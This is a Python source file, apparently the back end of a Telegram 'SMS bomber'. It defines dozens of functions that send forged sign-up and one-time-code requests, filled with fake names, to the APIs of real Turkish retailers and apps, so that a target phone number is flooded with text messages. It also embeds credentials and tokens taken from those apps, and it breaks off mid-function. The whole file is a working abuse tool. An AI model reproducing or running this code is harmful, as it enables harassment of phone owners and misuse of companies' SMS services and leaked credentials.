import telebot
import time
import random
import requests
import urllib3
import json
import string
import json
import uuid
import urllib.parse


def KahveDunyasi(number):    
    try:    
        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Page-Url": "/kayit-ol",
            "Content-Type": "application/json;charset=utf-8",
            "Positive-Client": "kahvedunyasi",
            "Positive-Client-Type": "web",
            "Store-Id": "1",
            "Origin": "https://www.kahvedunyasi.com",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Referer": "https://www.kahvedunyasi.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Te": "trailers",
            "Connection": "close"
        }
        json_data = {"mobile_number": number, "token_type": "register_token"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "KahveDunyasi"
        else:
            return False, "KahveDunyasi"
    except:    
        return False, "KahveDunyasi"


def Wmf(number):
    try:
        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
            "confirm": "true",
            "date_of_birth": "1956-03-01",
            "email": "",  # Replace with appropriate email data
            "email_allowed": "true",
            "first_name": "Memati",
            "gender": "male",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "phone": f"0{number}"
        }, timeout=6)
        if wmf.status_code == 202:
            return True, "Wmf"
        else:
            return False, "Wmf"
    except:
        return False, "Wmf"


def Icq(number):
    try:
        url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{number}&platform=ios&r=796356153&smsFormatType=human"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        r = requests.post(url, headers=headers, timeout=6)
        if r.json()["response"]["statusCode"] == 200:
            return True, "Icq"
        else:
            return False, "Icq"
    except:
        return False, "Icq"


def Suiste(number):
    try:
        url = "https://suiste.com:443/api/auth/code"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
            "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
            "Accept-Language": "en"
        }
        data = {"action": "register", "gsm": number}
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json()["code"] == "common.success":
            return True, "Suiste"
        else:
            return False, "Suiste"
    except:
        return False, "Suiste"
            
    
def Evidea(number):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
            "X-Project-Name": "undefined",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.evidea.com/",
            "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
            "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
        }
        data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{number}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "Evidea"
        else:
            return False, "Evidea"
    except:
        return False, "Evidea"



    #345dijital.com
def Ucdortbes(number):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "null",
            "Connection": "close"
        }
        json_data = {
            "email": "",
            "name": "Memati",
            "phoneNumber": f"+90{number}",
            "surname": "Bas"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        response_json = r.json()
        if "error" in response_json and response_json["error"] == "E-Posta veya telefon zaten kayıtlı!":
            return False, "345dijital.com"
        elif r.status_code == 200:
            return True, "345dijital.com"
        else:
            return False, "345dijital.com"
    except Exception as e:
        return False, f"345dijital.com: {str(e)}"


#ayyildiz.com.tr
def Ayyildiz(number):
    try:
        url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={number}"
        headers = {
            "Accept": "*/*",
            "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
            "Devicetype": "mobileapp",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"
        }
        r = requests.post(url, headers=headers, timeout=6)
        response_json = r.json()
        if response_json.get("Success", False):
            return True, "ayyildiz.com.tr"
        else:
            return False, "ayyildiz.com.tr"
    except Exception as e:
        return False, f"ayyildiz.com.tr: {str(e)}"


#naosstars.com
def Naosstars(number):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        headers = {
            "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
            "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Access-Control-Allow-Origin": "*",
            "Locale": "en-TR",
            "Version": "1.0030",
            "Os": "ios",
            "Apiurl": "https://api.naosstars.com/api/",
            "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
            "Platform": "ios",
            "Accept-Language": "en-US,en;q=0.9",
            "Timezone": "Europe/Istanbul",
            "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
            "Timezoneoffset": "-180",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Apitype": "mobile_app"
        }
        json_data = {"telephone": f"+90{number}", "type": "register"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "naosstars.com"
        else:
            return False, "naosstars.com"
    except Exception as e:
        return False, f"naosstars.com: {str(e)}"


#koton.com
def Koton(number):
    try:
        url = "https://www.koton.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
            "X-Project-Name": "rn-env",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.koton.com/",
            "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
        }
        data = f"""--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="first_name"

Memati
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="last_name"

Bas
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="email"

{self.mail}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="password"

31ABC..abc31
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="phone"

0{number}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="confirm"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="sms_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="email_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="date_of_birth"

1993-07-02
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="call_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="gender"



--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--
"""
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "koton.com"
        else:
            raise
    except:
        return False, "koton.com"


#metro-tr.com
def Metro(number):
    try:
        url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Applicationversion": "2.1.1",
            "Applicationplatform": "2",
            "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
            "Connection": "close"
        }
        json_data = {"methodType": "2", "mobilePhoneNumber": f"+90{number}"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json()["status"] == "success":
            return True, "metro-tr.com"
        else:
            raise
    except:
        return False, "metro-tr.com"


        
#ak-asya.com.tr
def Akasya(number):
    try:
        url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        json={"phone": number}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akasya-admin.poilabs.com"
        else:
            raise
    except:
        return False, "akasya-admin.poilabs.com"


#akbati.com
def Akbati(number):
    try:
        url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        json={"phone": number}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akbati-admin.poilabs.com"
        else:
            raise
    except:
        return False, "akbati-admin.poilabs.com"


#clickmelive.com
def Clickme(number):
    try:
        url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
        headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.4.0", "Client-Device": "IOS", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json={"phone": number}
        r = requests.post(url=url, json=json, headers=headers, timeout=6)
        if r.json()["isSuccess"] == True:
            return True, "mobile-gateway.clickmelive.com"
        else:
            raise
    except:
        return False, "mobile-gateway.clickmelive.com"
    
    
    #happy.com.tr
def Happy(number):
    try:
        url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
        data = {"telephone": number}
        r = requests.post(url=url, data=data, headers=headers, timeout=6)
        if r.status_code == 200:
            return True, "happy.com.tr"
        else:
            raise
    except:
        return False, "happy.com.tr"


#komagene.com.tr
def Komagene(number):
    try:
        url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
        json={"Telefon": number,"FirmaId": "32"}
        headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["Success"] == True:
            return True, "gateway.komagene.com.tr"
        else:
            raise
    except:
        return False, "gateway.komagene.com.tr"


#kuryemgelsin.com
def KuryemGelsin(number):
    try:
        url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
        json={"phoneNumber": number, "phone_country_code": "+90"}
        r = requests.post(url=url, json=json, timeout=6)
        if r.status_code == 200:
            return True, "api.kuryemgelsin.com"
        else:
            raise
    except:
        return False, "api.kuryemgelsin.com"


#porty.tech
def Porty(number):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
        json={"job": "start_login", "phone": number}
        r = requests.post(url=url, json=json, headers=headers, timeout=6)
        if r.json()["status"]== "success":
            return True, "panel.porty.tech"
        else:
            raise
    except:
        return False, "panel.porty.tech"
            
    
#taksim.digital
def Taksim(number):
    try:
        url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
        headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
        json={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": number, "surname": "Bas"}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["success"]== True:
            return True, "service.taksim.digital"
        else:
            raise
    except:
        return False, "service.taksim.digital"


#vakiftasdelensu.com
def Tasdelen(number):
    try:
        url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
        json= {"PhoneNumber": number, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
        r = requests.post(url=url, json=json, timeout=6)
        if r.json()["Result"]== True:
            return True, "94.102.66.162:80"
        else:
            raise
    except:
        return False, "94.102.66.162:80"


#tasimacim.com
def Tasimacim(number):
    try:
        url = "https://server.tasimacim.com/requestcode"
        json= {"phone": number, "lang": "tr"}
        r = requests.post(url=url, json=json, timeout=6)
        if r.status_code == 200:
            return True, "server.tasimacim.com"
        else:
            raise
    except:
        return False, "server.tasimacim.com"


#toptanteslim.com
def ToptanTeslim(number):
    try:
        url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "Mode": "no-cors", "U": "e-ticaret", "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        data = {
            "ADRES": "ZXNlZGtm", 
            "DIL": "tr_TR", 
            "EPOSTA": "",
            "EPOSTA_BILDIRIM": True, 
            "ILCE": "BAŞAKŞEHİR", 
            "ISLEM": "KayitOl", 
            "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", 
            "KIMLIKNO": None, 
            "KULLANICI_ADI": "Memati", 
            "KULLANICI_SOYADI": "Bas", 
            "PARA_BIRIMI": "TL", 
            "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", 
            "POSTAKODU": "377777", 
            "SEHIR": "İSTANBUL", 
            "SEMT": "BAŞAKŞEHİR MAH.", 
            "SMS_BILDIRIM": True, 
            "TELEFON": number, 
            "TICARI_UNVAN": "kdkd", 
            "ULKE_ID": 1105, 
            "VERGI_DAIRESI": "sjje", 
            "VERGI_NU": ""
        }
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json()["Durum"] == True:
            return True, "toptanteslim.com"
        else:
            raise
    except:
        return False, "toptanteslim.com"


#uysalmarket.com.tr
def Uysal(number):
    try:
        url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
        json={"phone_number": number}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.status_code == 200:
            return True, "api.uysalmarket.com.tr"
        else:
            raise
    except:
        return False, "api.uysalmarket.com.tr"


#yapp.com.tr
def Yapp(number):
    try:
        url = "https://yapp.com.tr:443/api/mobile/v1/register"
        json_data = {
            "app_version": "1.1.2", 
            "code": "tr", 
            "device_model": "iPhone9,4", 
            "device_name": "", 
            "device_type": "I", 
            "device_version": "15.7.8", 
            "email": "",
            "firstname": "Memati", 
            "is_allow_to_communication": "1", 
            "language_id": "1", 
            "lastname": "Bas", 
            "phone_number": number, 
            "sms_code": ""
        }
        r = requests.post(url=url, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "yapp.com.tr"
        else:
            raise
    except:
        return False, "yapp.com.tr"


#yilmazticaret.net
def YilmazTicaret(number):
    try:
        url = "http://www.yilmazticaret.net:80/restapi2/register/"
        headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
        data = {"telefon": (None, f"0 {number}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
        r = requests.post(url, headers=headers,  data=data, timeout=6)
        if r.json()["giris"] == "success":
            return True, "yilmazticaret.net"
        else:
            raise
    except:
        return False, "yilmazticaret.net"


#yuffi.co
def Yuffi(number):
    try:
        url = "https://api.yuffi.co/api/parent/login/user"
        json = {"phone": number, "kvkk": True}
        r = requests.post(url, json=json, timeout=6)
        if r.json()["success"] == True:
            return True, "api.yuffi.co"
        else:
            raise
    except:
        return False, "api.yuffi.co"


#beefull.com
def Beefull(number):
    try:
        url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
        json_data = {
            "email": "",  # E-posta adresi boş olacak
            "firstName": "Memati", 
            "language": "tr", 
            "lastName": "Bas", 
            "password": "123456", 
            "phoneCode": "90", 
            "phoneNumber": number, 
            "tenant": "beefull", 
            "username": ""
        }
        requests.post(url, json=json_data, timeout=4)
        url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
        json_data = {
            "phoneCode": "90", 
            "phoneNumber": number, 
            "tenant": "beefull"
        }
        r = requests.post(url, json=json_data, timeout=4)
        if r.status_code == 200:
            return True, "app.beefull.io"
        else:
            raise
    except:
        return False, "app.beefull.io"


#starbucks.com.tr
def Starbucks(number):
    try:
        url = "https://auth.sbuxtr.com:443/signUp"
        headers = {"Content-Type": "application/json", "Operationchannel": "ios", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br"}
        json_data = {
            "allowEmail": True,
            "allowSms": True,
            "deviceId": "31",
            "email": "",
            "firstName": "Memati",
            "lastName": "Bas",
            "password": "31ABC..abc31",
            "phoneNumber": number,
            "preferredName": "Memati"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json()["code"] == 50:
            return True, "auth.sbuxtr.com"
        else:
            raise
    except:
        return False, "auth.sbuxtr.com"


#dominos.com.tr
def Dominos(number):
    try:
        url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
        headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
        json={"email": "", "isSure": False, "mobilePhone": number}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["isSuccess"] == True:
            return True, "frontend.dominos.com.tr"
        else:
            raise
    except:
        return False, "frontend.dominos.com.tr"


#baydoner.com
def Baydoner(number):
    try:
        url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
        headers = {"Content-Type": "application/json", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.9", "Platform": "1", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json={"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": "", "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": number, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["Control"] == 1:
            return True, "crmmobil.baydoner.com"
        else:
            raise
    except:
        return False, "crmmobil.baydoner.com"


#pidem.com.tr
def Pidem(number):
    try:
        url = "https://restashop.azurewebsites.net:443/graphql/"
        headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
        json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": number}}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
            return True, "restashop.azurewebsites.net"
        else:
            raise
    except:
        return False, "restashop.azurewebsites.net"


#frink.com.tr
def Frink(phone):
    try:
        url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
        json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + phone}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["processStatus"] == "SUCCESS":
            return True, "api.frink.com.tr"
        else:
            raise
    except:
        return False, "api.frink.com.tr"



def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"


def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto"
        else:
            return False, "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin"
        else:
            return False, "İsteGelsin"
    except:
        return False, "İsteGelsin"


def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
